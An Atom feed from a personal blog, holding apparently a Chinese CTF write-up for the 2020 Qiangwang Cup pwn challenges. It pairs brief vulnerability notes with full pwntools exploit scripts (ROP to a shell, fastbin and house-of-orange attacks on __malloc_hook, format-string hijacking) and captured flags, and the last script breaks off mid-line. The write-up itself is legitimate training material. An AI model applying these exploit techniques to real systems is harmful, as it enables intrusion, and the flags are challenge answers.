<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2021-11-01T02:47:23.000Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IDA Python</title>
    <link href="https://nocbtm.github.io/2021/11/01/IDA-Python/"/>
    <id>https://nocbtm.github.io/2021/11/01/IDA-Python/</id>
    <published>2021-11-01T02:47:23.000Z</published>
    <updated>2021-11-01T02:47:23.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2020强网杯pwn wp</title>
    <link href="https://nocbtm.github.io/2020/08/30/2020%E5%BC%BA%E7%BD%91%E6%9D%AFpwn-wp/"/>
    <id>https://nocbtm.github.io/2020/08/30/2020强网杯pwn-wp/</id>
    <published>2020-08-30T11:25:19.000Z</published>
    <updated>2020-09-01T12:47:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>ctf真是秃头爆肝游戏，肝了两天出了六道pwn，pwn题真的太多了，做到不想做。</p><p>最终48名，尽力了，没有进线下。</p><p><img alt="img" data-src="https://nocbtm.github.io/imgs/ISEE3DP466PG13.png" class="lozad"></p><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><p>leave_message 函数有栈溢出，先构造rop链泄漏libc_addr，然后再次溢出，构造systme(“/bin/sh”)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">pwn_name = <span class="string">"babymessage"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>, <span class="number">21342</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"name:"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"message:"</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice"</span>, <span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">256</span>) + <span class="string">"\n"</span>)</span><br><span class="line">msg(<span class="string">"a"</span> * <span class="number">8</span> + p64(<span class="number">0x6010D0</span> + <span class="number">4</span>) + <span class="string">"b"</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(<span class="number">0x601038</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac1</span>) + p64(<span class="number">0x601038</span>) * <span class="number">2</span> +  p64(<span class="number">0x400670</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0x40080A</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"message:"</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">read_libc = u64(p.recv(<span class="number">6</span>) + <span class="string">"\x00\x00"</span>)</span><br><span class="line">log.success(<span class="string">"0x%x"</span> %read_libc)</span><br><span class="line"></span><br><span class="line">libc_base = read_libc - <span class="number">0x110180</span></span><br><span class="line">log.success(<span class="string">"0x%x"</span> %libc_base)</span><br><span class="line">binsh = libc_base + <span class="number">0x1B40FA</span></span><br><span class="line">system_ = libc_base + <span class="number">0x4f4e0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(binsh) + p64(system_)</span><br><span class="line">p.sendafter(<span class="string">"message:"</span>, payload + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h2><p>free的时候idx可以输入负数，register时刚好输入的age就在chunk_list上面，先泄露出libc_addr和堆的地址，然后更新age为堆块的地址，即可造成堆块复用，然后用fatsbin attack 攻击<code>__malloc_hook</code>为onegadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"babynotes"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>, <span class="number">43121</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">    p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name,motto,age)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"name: \n"</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">"motto: \n"</span>,motto)</span><br><span class="line">    p.sendlineafter(<span class="string">"age: \n"</span>,str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">register(<span class="string">"n"</span>*<span class="number">0x17</span>,<span class="string">"a"</span>*<span class="number">0x20</span>,<span class="number">0x66666666</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x3c4b78</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=leak<span class="number">-0x230</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">register(<span class="string">"n"</span>*<span class="number">0x17</span>,<span class="string">"a"</span>*<span class="number">0x20</span>,heap_addr+<span class="number">0x1d0</span>)</span><br><span class="line">free(<span class="number">-3</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">"__malloc_hook"</span>]<span class="number">-0x23</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one[<span class="number">3</span>]+libc.address))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;df8791b3e5b410506265d92cd8396e59&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a>Just_a_Galgame</h2><p>edit的时候没有检查idx，且有溢出，溢出修改top_chunk的size,需要满足内存页对齐，house of orange 攻击，会有free过后的unsorted bin ，再次申请小堆块，可泄漏libc_addr, 5功能可写入<code>__malloc_hook-0x60</code>的地址进行攻击，然后edit写入onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Just_a_Galgame"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">"123.56.170.202"</span>, <span class="number">52114</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span>  <span class="comment">#0x68</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,meg)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;"</span>,meg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">()</span>:</span> <span class="comment">#0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd41</span>))</span><br><span class="line"></span><br><span class="line">add2()</span><br><span class="line">add()</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ec2a0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3ebc30</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.send(p64(malloc_hook<span class="number">-0x60</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,p64(one[<span class="number">1</span>]+libc_base))</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;145f2d9125917286c21df2bf470a8a81&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><p>sub_1212 里面很明显的格式化字符串，先泄露出libc_addr和ebp_addr，然后修改mian函数返回地址为onegadget，最终修改，sub_1212函数返回地址为main函数里面的leave ret，即可跳出while循环，劫持程序执行流为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Siri"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>,<span class="number">12124</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">    p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">    libc=ELF(<span 